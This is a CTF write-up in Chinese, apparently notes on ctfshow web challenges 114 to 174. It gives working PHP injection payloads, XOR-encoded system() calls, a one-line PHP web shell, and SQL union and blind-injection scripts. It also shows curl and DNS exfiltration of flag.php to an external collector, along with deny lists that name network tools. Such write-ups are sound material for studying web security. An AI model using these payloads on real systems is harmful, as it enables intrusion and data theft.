?file&#x3D;&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;proc&#x2F;self&#x2F;root&#x2F;var&#x2F;www&#x2F;html&#x2F;flag.php web114 不带编码的filter web115include(&#39;flag.php&#39;); highlight_file(__FILE__); error_reporting(0); function filter($num)&#123; $num&#x3D;str_replace(&quot;0x&quot;,&quot;1&quot;,$num); $num&#x3D;str_replace(&quot;0&quot;,&quot;1&quot;,$num); $num&#x3D;str_replace(&quot;.&quot;,&quot;1&quot;,$num); $num&#x3D;str_replace(&quot;e&quot;,&quot;1&quot;,$num); $num&#x3D;str_replace(&quot;+&quot;,&quot;1&quot;,$num); return $num; &#125; $num&#x3D;$_GET[&#39;num&#39;]; if(is_numeric($num) and $num!&#x3D;&#x3D;&#39;36&#39; and trim($num)!&#x3D;&#x3D;&#39;36&#39; and filter($num)&#x3D;&#x3D;&#39;36&#39;)&#123; if($num&#x3D;&#x3D;&#39;36&#39;)&#123; echo $flag; &#125;else&#123; echo &quot;hacker!!&quot;; &#125; &#125;else&#123; echo &quot;hacker!!!&quot;; &#125; 在不影响数字类型的前提下能加的字符除了数字和+-.号以外还有 %09 %0a %0b %0c %0d %20，trim过滤了 %09 %0a %0b %0d %20，所以只剩下%0c换页符了 payload： num=%0c36 web123error_reporting(0); highlight_file(__FILE__); include(&quot;flag.php&quot;); $a&#x3D;$_SERVER[&#39;argv&#39;]; $c&#x3D;$_POST[&#39;fun&#39;]; if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123; if(!preg_match(&quot;&#x2F;\\\\\\\\|\\&#x2F;|\\~|\\&#96;|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\&#x3D;|\\&#123;|\\&#125;|\\&quot;|\\&#39;|\\,|\\.|\\;|\\?&#x2F;&quot;, $c)&amp;&amp;$c&lt;&#x3D;18)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125; &#125; PHP变量名应该只有数字字母下划线,同时GET或POST方式传进去的变量名,会自动将空格+ . [转换为_ 所以我们没有办法post CTF_SHOW.COM进去 这里就用到了php变量名特性绕过 在变量名中出现了[的话，在get、post传参中，[就会被替换成_，然后其后的字母不会发生变化，CTF[SHOW.COM=&gt;CTF_SHOW.COM 然后直接输出flag变量 再来几个其他的 CTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=var_export($GLOBALS)读取全局变量 payload: get: $fl0g&#x3D;flag_give_me; post: CTF_SHOW&#x3D;1&amp;CTF%5bSHOW.COM&#x3D;1&amp;fun&#x3D;eval($a[0]) 这种就是在eval里执行这个赋值语句$fl0g=flag_give_me;就能满足后边的判断输出flag 下面这个是预期解 web125error_reporting(0); highlight_file(__FILE__); include(&quot;flag.php&quot;); $a&#x3D;$_SERVER[&#39;argv&#39;]; $c&#x3D;$_POST[&#39;fun&#39;]; if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123; if(!preg_match(&quot;&#x2F;\\\\\\\\|\\&#x2F;|\\~|\\&#96;|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\&#x3D;|\\&#123;|\\&#125;|\\&quot;|\\&#39;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print&#x2F;i&quot;, $c)&amp;&amp;$c&lt;&#x3D;16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125; &#125; ?&gt; 可以用123的预期解 或者包含一下 web126error_reporting(0); highlight_file(__FILE__); include(&quot;flag.php&quot;); $a&#x3D;$_SERVER[&#39;argv&#39;]; $c&#x3D;$_POST[&#39;fun&#39;]; if(isset($_POST[&#39;CTF_SHOW&#39;])&amp;&amp;isset($_POST[&#39;CTF_SHOW.COM&#39;])&amp;&amp;!isset($_GET[&#39;fl0g&#39;]))&#123; if(!preg_match(&quot;&#x2F;\\\\\\\\|\\&#x2F;|\\~|\\&#96;|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\&#x3D;|\\&#123;|\\&#125;|\\&quot;|\\&#39;|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d&#x2F;i&quot;, $c) &amp;&amp; strlen($c)&lt;&#x3D;16)&#123; eval(&quot;$c&quot;.&quot;;&quot;); if($fl0g&#x3D;&#x3D;&#x3D;&quot;flag_give_me&quot;)&#123; echo $flag; &#125; &#125; &#125; 123的预期解还是能用，或者是 ?$fl0g&#x3D;flag_give_me POST:CTF_SHOW&#x3D;&amp;CTF[SHOW.COM&#x3D;&amp;fun&#x3D;assert($a[0])&#x2F;&#x2F;就是用assert替换eval web127error_reporting(0); include(&quot;flag.php&quot;); highlight_file(__FILE__); $ctf_show &#x3D; md5($flag); $url &#x3D; $_SERVER[&#39;QUERY_STRING&#39;]; &#x2F;&#x2F;特殊字符检测 function waf($url)&#123; if(preg_match(&#39;&#x2F;\\&#96;|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\&#123;|\\;|\\:|\\[|\\]|\\&#125;|\\&#39;|\\&quot;|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\&#x2F;&#x2F;&#39;, $url))&#123; return true; &#125;else&#123; return false; &#125; &#125; if(waf($url))&#123; die(&quot;嗯哼？&quot;); &#125;else&#123; extract($_GET); &#125; if($ctf_show&#x3D;&#x3D;&#x3D;&#39;ilove36d&#39;)&#123; echo $flag; 下划线被过滤了，可以用空格代替 payload ?ctf show&#x3D;ilove36d web128 _()是一个函数 _()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll 当php开启了gettext扩展后，可以绕过字母 echo gettext(phpinfo());&#x3D;&#x3D;&#x3D;echo _(phpinfo()); get_defined_vars() get_defined_vars — 返回由所有已定义变量所组成的数组 web129f&#x3D;..&#x2F;ctfshow&#x2F;..&#x2F;html&#x2F;flag.php 目录穿越 web130error_reporting(0); highlight_file(__FILE__); include(&quot;flag.php&quot;); if(isset($_POST[&#39;f&#39;]))&#123; $f &#x3D; $_POST[&#39;f&#39;]; if(preg_match(&#39;&#x2F;.+?ctfshow&#x2F;is&#39;, $f))&#123; die(&#39;bye!&#39;); &#125; if(stripos($f, &#39;ctfshow&#39;) &#x3D;&#x3D;&#x3D; FALSE)&#123; die(&#39;bye!!&#39;); &#125; echo $flag; &#125; 利用preg_match的回溯限制，如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false。 也可以用数组绕过 第二个正则匹配是强等于，类型必须相同 采用数组绕过的方法，stripos函数会返回null,null!=false,所以可以绕过stripos函数 web131跟web132差不多，就是不知道为什么不能数组绕过，只能利用最大回溯了 web132 if(isset($_GET[&#39;username&#39;]) &amp;&amp; isset($_GET[&#39;password&#39;]) &amp;&amp; isset($_GET[&#39;code&#39;]))&#123; $username &#x3D; (String)$_GET[&#39;username&#39;]; $password &#x3D; (String)$_GET[&#39;password&#39;]; $code &#x3D; (String)$_GET[&#39;code&#39;]; if($code &#x3D;&#x3D;&#x3D; mt_rand(1,0x36D) &amp;&amp; $password &#x3D;&#x3D;&#x3D; $flag || $username &#x3D;&#x3D;&#x3D;&quot;admin&quot;)&#123; if($code &#x3D;&#x3D; &#39;admin&#39;)&#123; echo $flag; &#125; &#125; &#125; 让if为真只要让username=admin就行 web133error_reporting(0); highlight_file(__FILE__); &#x2F;&#x2F;flag.php if($F &#x3D; @$_GET[&#39;F&#39;])&#123; if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|netcat&#x2F;i&#39;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;6个字母都还不够呀?!&quot;); &#125; &#125; get传参 F&#x3D;&#96;$F &#96;;sleep 3 经过substr($F,0,6)截取后 得到 &#96;$F &#96;; 也就是会执行 eval(&quot;&#96;$F &#96;;&quot;); 我们把原来的$F带进去 eval(&quot;&#96;&#96;$F &#96;;sleep 3&#96;&quot;); 也就是说最终会执行 &#96;&#96;$F &#96;;sleep 3&#96; &#x3D;&#x3D; shell_exec(&quot;&#96;$F &#96;;sleep 3&quot;); 前面的命令我们不需要管，但是后面的命令我们可以自由控制。 这样就在服务器上成功执行了 sleep 3 然后因为没有回显，可以通过curl外带来查看这里可以用bp也可以用vpscurl -F 将flag文件上传到Burp的 Collaborator Client （ Collaborator Client 类似DNSLOG，其功能要比DNSLOG强大，主要体现在可以查看 POST请求包以及打Cookies） ?F&#x3D;&#96;$F&#96;;+curl -X POST -F xx&#x3D;@flag.php http:&#x2F;&#x2F;8clb1g723ior2vyd7sbyvcx6vx1ppe.burpcollaborator.net #其中-F 为带文件的形式发送post请求 #xx是上传文件的name值，flag.php就是上传的文件 还可以利用cp命令将flag.php里的内容复制到一个txt内，然后直接访问 &#96;$F&#96; ;cp flag.php 1234.txt 还可以dnslog外带 web134highlight_file(__FILE__); $key1 &#x3D; 0; $key2 &#x3D; 0; if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) &#123; die(&quot;nonononono&quot;); &#125; @parse_str($_SERVER[&#39;QUERY_STRING&#39;]); extract($_POST); if($key1 &#x3D;&#x3D; &#39;36d&#39; &amp;&amp; $key2 &#x3D;&#x3D; &#39;36d&#39;) &#123; die(file_get_contents(&#39;flag.php&#39;)); &#125; 不能传入key1，key2，可以利用extract的变量覆盖绕过 $_SERVER[‘QUERY_STRING’]获取查询语句，实例中可知，获取的是?后面的值，只有get请求 extract()该函数是将数组中的值依次复制给$键=值 parse_string()将字符串解析到变量中 如果未设置 array 参数，则由该函数设置的变量将覆盖已存在的同名变量。 payload： ?_POST[key1]&#x3D;36d&amp;_POST[key2]&#x3D;36d web135error_reporting(0); highlight_file(__FILE__); &#x2F;&#x2F;flag.php if($F &#x3D; @$_GET[&#39;F&#39;])&#123; if(!preg_match(&#39;&#x2F;system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head&#x2F;i&#39;, $F))&#123; eval(substr($F,0,6)); &#125;else&#123; die(&quot;师傅们居然破解了前面的，那就来一个加强版吧&quot;); &#125; &#125; nl，cat，tac，more，less，tail等都可以读文件 awk加上NR参数可以读取指定行数，记得加引号 tr -cd 后面可以加正则表达式 用ping的话建议用dnslog.cn别用ceye.io，因为ceye给的域名在ping的时候会显示找不到主机，没法成功ping 而且只要这个payload才能成功 F&#x3D;&#96;$F&#96;; ping &#96;nl flag.php|awk &#39;&#x2F;flag&#x2F;&#39;| tr -cd &quot;[a-z]&quot;&#x2F;&quot;[0-9]&quot;&#96;.klj10h.dnslog.cn -c 1 这里直接nl带不出来可能是因为内容太多了，但是awk后边的flag换成ctfshow也出不了我不太清楚为什么 可以用下边这个命令查看目录 printf &#39;%s&#39; * web136error_reporting(0); function check($x)&#123; if(preg_match(&#39;&#x2F;\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123; die(&#39;too young too simple sometimes naive!&#39;); &#125; &#125; if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; check($c); exec($c); &#125; else&#123; highlight_file(__FILE__); &#125; exec无回显 要尝试将命令的结果输入到一个文件中 在没有&gt;的前提下可以利用tee命令 tee file //覆盖 tee -a file //追加 tee - //输出到标准输出两次 tee --//输出到标准输出三次 tee file1 file2 // 输出到标准输出两次，并写到那两个文件中 ls | tee file 所以payload： ls &#x2F;|tee a nl &#x2F;f149_15_h3r3|tee a web137&lt;?php error_reporting(0); highlight_file(__FILE__); class ctfshow &#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125; &#125; call_user_func($_POST[&#39;ctfshow&#39;]); 考察调用类中的函数双冒号可以不用实例化类就可以直接调用类中的方法 ctfshow&#x3D;ctfshow::getFlag php中 -&gt;与:: 调用类中的成员的区别 -&gt;用于动态语境处理某个类的某个实例 ::可以调用一个静态的、不依赖于其他初始化的类方法. web138error_reporting(0); highlight_file(__FILE__); class ctfshow &#123; function __wakeup()&#123; die(&quot;private class&quot;); &#125; static function getFlag()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125; &#125; if(strripos($_POST[&#39;ctfshow&#39;], &quot;:&quot;)&gt;-1)&#123; die(&quot;private function&quot;); &#125; call_user_func($_POST[&#39;ctfshow&#39;]); call_user_func()可以传数组 payload ctfshow[]&#x3D;ctfshow&amp;ctfshow[]&#x3D;getFlag web139&lt;?php error_reporting(0); function check($x)&#123; if(preg_match(&#39;&#x2F;\\\\$|\\.|\\!|\\@|\\#|\\%|\\^|\\&amp;|\\*|\\?|\\&#123;|\\&#125;|\\&gt;|\\&lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp&#x2F;i&#39;, $x))&#123; die(&#39;too young too simple sometimes naive!&#39;); &#125; &#125; if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; check($c); exec($c); &#125; else&#123; highlight_file(__FILE__); &#125; ?&gt; 虽然看起来和136差不多，但是没了写文件的权限 盲打看起来有些离谱 放一下脚本吧就(不实践了，跑脚本也不需要啥技术 获取文件名的脚本： import requests import time import string str&#x3D;string.ascii_letters+string.digits #生成所有字母与数字[a-zA-Z0-9] result&#x3D;&quot;&quot; for i in range(1,5): key&#x3D;0 for j in range(1,15): if key&#x3D;&#x3D;1: break for n in str: payload&#x3D;&quot;if [ &#96;ls &#x2F;|awk &#39;NR&#x3D;&#x3D;&#123;0&#125;&#39;|cut -c &#123;1&#125;&#96; &#x3D;&#x3D; &#123;2&#125; ];then sleep 3;fi&quot;.format(i,j,n) #print(payload) url&#x3D;&quot;http:&#x2F;&#x2F;877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c&#x3D;&quot;+payload try: requests.get(url,timeout&#x3D;(2.5,2.5)) except: result&#x3D;result+n print(result) break if n&#x3D;&#x3D;&#39;9&#39;: key&#x3D;1 result+&#x3D;&quot; &quot; 猜解文件内容的脚本： import requests import time import string str&#x3D;string.digits+string.ascii_lowercase+&quot;-&quot;#获取小写字母与数字 result&#x3D;&quot;&quot; key&#x3D;0 for j in range(1,45): print(j) if key&#x3D;&#x3D;1: break for n in str: payload&#x3D;&quot;if [ &#96;cat &#x2F;f149_15_h3r3|cut -c &#123;0&#125;&#96; &#x3D;&#x3D; &#123;1&#125; ];then sleep 3;fi&quot;.format(j,n) #print(payload) url&#x3D;&quot;http:&#x2F;&#x2F;877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c&#x3D;&quot;+payload try: requests.get(url,timeout&#x3D;(2.5,2.5)) #time()第一个参数是响应时间，第二个是读取时间 except: result&#x3D;result+n print(result) break 一些分析 用awk命令、cut命令截取字符 sleep命令确认是否正确 awk NR&#x3D;&#x3D;2 获取第二行信息 cut -c 1 截取第1个字符 zsh下if语句的格式： if [[condition]] &#123;command &#125; elif &#123; &#125; else &#123; &#125; web140&lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_POST[&#39;f1&#39;]) &amp;&amp; isset($_POST[&#39;f2&#39;]))&#123; $f1 &#x3D; (String)$_POST[&#39;f1&#39;]; $f2 &#x3D; (String)$_POST[&#39;f2&#39;]; if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f1))&#123; if(preg_match(&#39;&#x2F;^[a-z0-9]+$&#x2F;&#39;, $f2))&#123; $code &#x3D; eval(&quot;return $f1($f2());&quot;); if(intval($code) &#x3D;&#x3D; &#39;ctfshow&#39;)&#123; echo file_get_contents(&quot;flag.php&quot;); &#125; &#125; &#125; &#125; php的弱比较 intval会将非数字字符转换为0 而0==“字符串”为真 所以只要让等号右边的玩意是字符串就行了 md5(phpinfo()) md5(sleep()) md5(md5()) current(localeconv) sha1(getcwd()) 因为&#x2F;var&#x2F;www&#x2F;html md5后开头的数字所以我们改用sha1 web141#error_reporting(0); highlight_file(__FILE__); if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123; $v1 &#x3D; (String)$_GET[&#39;v1&#39;]; $v2 &#x3D; (String)$_GET[&#39;v2&#39;]; $v3 &#x3D; (String)$_GET[&#39;v3&#39;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#39;&#x2F;^\\W+$&#x2F;&#39;, $v3))&#123; $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 &#x3D; &quot;.$code; &#125; &#125; &#125; /^\\W+$/用于匹配非数字字母下划线的字符 这里只要求v1v2是数字就行，而在PHP中 数字可以和命令进行一些运算，比如1-phpinfo()-1输出的还是phpinfo()所以这里可以1-system(&#39;tac f*&#39;)-1构造的话或、取反或者异或都行 v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;-(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;)- &#x2F;&#x2F;system(&#39;cat flag.php&#39;) web142&lt;?php error_reporting(0); highlight_file(__FILE__); if(isset($_GET[&#39;v1&#39;]))&#123; $v1 &#x3D; (String)$_GET[&#39;v1&#39;]; if(is_numeric($v1))&#123; $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); sleep($d); echo file_get_contents(&quot;flag.php&quot;); &#125; &#125; 直接让v1=0或0x0 web143error_reporting(0); highlight_file(__FILE__); if(isset($_GET[&#39;v1&#39;]))&#123; $v1 &#x3D; (String)$_GET[&#39;v1&#39;]; if(is_numeric($v1))&#123; $d &#x3D; (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d); sleep($d); echo file_get_contents(&quot;flag.php&quot;); &#125; &#125; 取反被过滤了，还可以用异或，减号可以用乘号替换，唯一的问题是在payload里不要有这些过滤了的字符的url编码，比如%2e 用%02^%2c来代表. payload v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;*(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%02%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2c%60%60%60&quot;)* web144&lt;?php highlight_file(__FILE__); if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123; $v1 &#x3D; (String)$_GET[&#39;v1&#39;]; $v2 &#x3D; (String)$_GET[&#39;v2&#39;]; $v3 &#x3D; (String)$_GET[&#39;v3&#39;]; if(is_numeric($v1) &amp;&amp; check($v3))&#123; if(preg_match(&#39;&#x2F;^\\W+$&#x2F;&#39;, $v2))&#123; $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 &#x3D; &quot;.$code; &#125; &#125; &#125; function check($str)&#123; return strlen($str)&#x3D;&#x3D;&#x3D;1?true:false; &#125; v2和v3换换顺序 ?v1&#x3D;1&amp;v3&#x3D;2&amp;v2&#x3D;-(&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%03%01%14%00%06%0c%01%07%00%10%08%10&quot;^&quot;%60%60%60%20%60%60%60%60%2e%60%60%60&quot;) web145highlight_file(__FILE__); if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123; $v1 &#x3D; (String)$_GET[&#39;v1&#39;]; $v2 &#x3D; (String)$_GET[&#39;v2&#39;]; $v3 &#x3D; (String)$_GET[&#39;v3&#39;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\\@|\\!|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\&#x2F;|\\^|\\#|\\&quot;&#x2F;i&#39;, $v3))&#123; die(&#39;get out hacker!&#39;); &#125; else&#123; $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 &#x3D; &quot;.$code; &#125; &#125; &#125; 可以用取反，然后利用三目运算来替代过滤了的加减乘除 payload ?v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;?(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F): 这里我本来想的是利用或运算的，但是发现或运算不同于异或和取反，它必须将|两边用引号引起来（不过单引号也行，当时只试了双引号 web146highlight_file(__FILE__); if(isset($_GET[&#39;v1&#39;]) &amp;&amp; isset($_GET[&#39;v2&#39;]) &amp;&amp; isset($_GET[&#39;v3&#39;]))&#123; $v1 &#x3D; (String)$_GET[&#39;v1&#39;]; $v2 &#x3D; (String)$_GET[&#39;v2&#39;]; $v3 &#x3D; (String)$_GET[&#39;v3&#39;]; if(is_numeric($v1) &amp;&amp; is_numeric($v2))&#123; if(preg_match(&#39;&#x2F;[a-z]|[0-9]|\\@|\\!|\\:|\\+|\\-|\\.|\\_|\\$|\\&#125;|\\%|\\&amp;|\\;|\\&lt;|\\&gt;|\\*|\\&#x2F;|\\^|\\#|\\&quot;&#x2F;i&#39;, $v3))&#123; die(&#39;get out hacker!&#39;); &#125; else&#123; $code &#x3D; eval(&quot;return $v1$v3$v2;&quot;); echo &quot;$v1$v3$v2 &#x3D; &quot;.$code; &#125; &#125; &#125; :也被过滤了，三目运算符用不了了，但是可以用或符号 ?v1&#x3D;1&amp;v2&#x3D;2&amp;v3&#x3D;|(&#39;%13%19%13%14%05%0d&#39;|&#39;%60%60%60%60%60%60&#39;)(&#39;%0c%13&#39;|&#39;%60%60&#39;)| web147&lt;?php highlight_file(__FILE__); if(isset($_POST[&#39;ctf&#39;]))&#123; $ctfshow &#x3D; $_POST[&#39;ctf&#39;]; if(!preg_match(&#39;&#x2F;^[a-z0-9_]*$&#x2F;isD&#39;,$ctfshow)) &#123; $ctfshow(&#39;&#39;,$_GET[&#39;show&#39;]); &#125; &#125; 一道creat_function构造匿名函数的rce https://paper.seebug.org/94/ 在PHP的命名空间默认为\\，所有的函数和类都在\\这个命名空间中，如果直接写函数名function_name()调用，调用的时候其实相当于写了一个相对路径；而如果写\\function_name() 这样调用函数，则其实是写了一个绝对路径。如果你在其他namespace里调用系统类，就必须写绝对路径这种写法。 create_function来完成，create_function的第一个参数是参数，第二个参数是内容。 所以我们可以构造payload get: return 2333;&#125;system(&#39;ls&#39;);&#x2F;&#x2F; post: ctf&#x3D;\\create_function 这个时候creat_function的结构类似 function a()&#123;return 2333;&#125;system(&#39;ls&#39;);&#x2F;&#x2F;&#125; 我们的命令成功逃逸了 web148&lt;?php include &#39;flag.php&#39;; if(isset($_GET[&#39;code&#39;]))&#123; $code&#x3D;$_GET[&#39;code&#39;]; if(preg_match(&quot;&#x2F;[A-Za-z0-9_\\%\\\\|\\~\\&#39;\\,\\.\\:\\@\\&amp;\\*\\+\\- ]+&#x2F;&quot;,$code))&#123; die(&quot;error&quot;); &#125; @eval($code); &#125; else&#123; highlight_file(__FILE__); &#125; function get_ctfshow_fl0g()&#123; echo file_get_contents(&quot;flag.php&quot;); &#125; 没过滤^可以直接异或 (&quot;%13%19%13%14%05%0d&quot;^&quot;%60%60%60%60%60%60&quot;)(&quot;%0c%13&quot;^&quot;%60%60&quot;); 预期解是是使用中文 ?code=$哈=&quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f* &quot;&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET 感觉多少有点抽象了 web149&lt;?php error_reporting(0); highlight_file(__FILE__); $files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; file_put_contents($_GET[&#39;ctf&#39;], $_POST[&#39;show&#39;]); $files &#x3D; scandir(&#39;.&#x2F;&#39;); foreach($files as $file) &#123; if(is_file($file))&#123; if ($file !&#x3D;&#x3D; &quot;index.php&quot;) &#123; unlink($file); &#125; &#125; &#125; 把除了index.php的文件全删了，看起来是文件竞争 但是有非预期，直接利用file_put_contents往index.php里写马就行 payload get: ctf&#x3D;index.php post: show&#x3D;&lt;?php eval($_GET[1]);?&gt; 然后访问index.php执行命令 web150&lt;?php &#x2F;* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-10-13 11:25:09 # @Last Modified by: h1xa # @Last Modified time: 2020-10-19 07:12:57 *&#x2F; include(&quot;flag.php&quot;); error_reporting(0); highlight_file(__FILE__); class CTFSHOW&#123; private $username; private $password; private $vip; private $secret; function __construct()&#123; $this-&gt;vip &#x3D; 0; $this-&gt;secret &#x3D; $flag; &#125; function __destruct()&#123; echo $this-&gt;secret; &#125; public function isVIP()&#123; return $this-&gt;vip?TRUE:FALSE; &#125; &#125; function __autoload($class)&#123; if(isset($class))&#123; $class(); &#125; &#125; #过滤字符 $key &#x3D; $_SERVER[&#39;QUERY_STRING&#39;]; if(preg_match(&#39;&#x2F;\\_| |\\[|\\]|\\?&#x2F;&#39;, $key))&#123; die(&quot;error&quot;); &#125; $ctf &#x3D; $_POST[&#39;ctf&#39;]; extract($_GET); if(class_exists($__CTFSHOW__))&#123; echo &quot;class is exists!&quot;; &#125; if($isVIP &amp;&amp; strrpos($ctf, &quot;:&quot;)&#x3D;&#x3D;&#x3D;FALSE)&#123; include($ctf); &#125; 利用extract变量覆盖让isVIP=1 日志写马 sql注入web171题目给了查询语句 $sql &#x3D; &quot;select id,username,password from ctfshow_user3 where username !&#x3D;&#39;flag&#39; and id &#x3D; &#39;&quot;.$_GET[&#39;id&#39;].&quot;&#39; limit 1;&quot;; 字符型注入，利用单引号闭合 联合注入 三个字段 查库，查表，查列名，查字段 payload（之后差不多的查询语句就写一个最终的payload就够了 -1&#39; union select database(),2,3--+ &#x2F;&#x2F;查库 -1&#39; union select group_concat(table_name),2,3 from information_schema.tables where table_schema&#x3D;&quot;ctfshow_web&quot; --+ &#x2F;&#x2F;查表 -1&#39; union select group_concat(column_name),2,3 from information_schema.columns where table_name&#x3D;&quot;ctfshow_user&quot;--+ &#x2F;&#x2F;查列名 -1&#39; union select group_concat(id,username,password),2,3 from ctfshow_user --+ &#x2F;&#x2F;最终payload web172select模块无过滤注入1//这个不就是web171吗（ -1&#39; union select group_concat(id,username,password),2,3 from ctfshow_user2 --+ select模块无过滤注入2少了一列，方法还是一样的 -1&#39; union select group_concat(username,password),3 from ctfshow_user2 --+ web173这里除了常规的sql语句外还有个过滤，其实172的无过滤注入2就有这个过滤，就是不知道为什么还是注出来了 if(!preg_match(&#39;&#x2F;flag&#x2F;i&#39;, json_encode($ret)))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;; &#125; 查询到的内容不能有flag这个字符串，简单一点就是不查username列，直接看password就行。或者用to_base64()来对username进行编码 最终payload -1&#39; union select group_concat(id,to_base64(username),password),2,3 from ctfshow_user3 --+ web174&#x2F;&#x2F;检查结果是否有flag if(!preg_match(&#39;&#x2F;flag|[0-9]&#x2F;i&#39;, json_encode($ret)))&#123; $ret[&#39;msg&#39;]&#x3D;&#39;查询成功&#39;; &#125; 不光过滤了flag，还过滤了数字，盲注看起来是最好的选择了，看大部分的wp也都是盲注 # @Author:Y4tacker import requests url &#x3D; &quot;http:&#x2F;&#x2F;e076200d-5e74-4121-b2fc-04153243f7a3.chall.ctf.show&#x2F;api&#x2F;v4.php?id&#x3D;1&#39; and &quot; result &#x3D; &#39;&#39; i &#x3D; 0 while True: i &#x3D; i + 1 head &#x3D; 32 tail &#x3D; 127 while head &lt; tail: mid &#x3D; (head + tail) &gt;&gt; 1 payload &#x3D; f&#39;1&#x3D;if(ascii(substr((select password from ctfshow_user4 limit 